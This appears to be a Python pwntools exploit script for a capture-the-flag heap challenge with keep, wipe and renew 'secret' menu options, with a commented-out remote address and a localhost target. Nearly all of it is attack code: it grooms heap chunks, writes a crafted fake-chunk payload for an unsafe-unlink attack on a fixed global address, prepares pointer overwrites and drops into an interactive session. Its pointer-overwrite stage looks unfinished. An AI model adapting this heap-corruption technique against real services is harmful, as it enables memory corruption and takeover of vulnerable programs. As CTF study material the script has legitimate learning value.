#!/usr/bin/python

from pwn import *

DEBUG = True

#p = remote("52.68.31.117", 5566)
p = remote('localhost', 4924)
#p = remote("localhost", 4000)

SMALL = 1
BIG = 2
HUGE = 3

size = [0, 0x28, 0xfa0, 0x61a80]

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def keep(option, msg):
  r("Renew secret")
  p.sendline("1")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ") 
  p.sendline(msg)

def wipe(option):
  r("Renew secret")
  p.sendline("2")

  r("Huge secret")
  p.sendline(str(option))

def renew(option, msg):
  r("Renew secret")
  p.sendline("3")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ")
  p.sendline(msg)


keep(HUGE, "A" * (0x1000 - 1))
wipe(HUGE)

keep(SMALL, "A" * (size[SMALL] - 1))
wipe(SMALL)

keep(HUGE, "A" * (0x1000 - 1))
wipe(SMALL)

keep(BIG, "A" * (size[BIG] - 1))
keep(SMALL, "A" * (size[SMALL] - 1))

wipe(BIG)

target = 0x6020a8

payload = p64(0)
payload += p64(0xfa1)
payload += p64(target - 0x18)
payload += p64(target - 0x10)
payload += p64(target - 0x8 - 0x28)
payload += p64(target - 0x8 - 0x20)
payload += "A" * 0xf70
payload += p64(0xfa0)
payload += p64(0x100)
payload += "A" * 0xf8
payload += p64(0x201)
payload += "A" * 0x1f8
payload += p64(0x80d51)
payload += "\x00" * (0x1000 - len(payload) - 1)

renew(HUGE, payload)

wipe(SMALL)

#keep(BIG, "A" * (size[BIG] - 1))

overwrite = p64(0x6020a0) # BIG BUF ptr
overwrite += p64(0x6020a0) # HUGE BUF ptr
overwrite += p64(0x6020a0) # BUF ptr
overwrite += p64(0x1 + 0x1 << 32)
overwrite += p64(0x1)

p.interactive()

p.close()
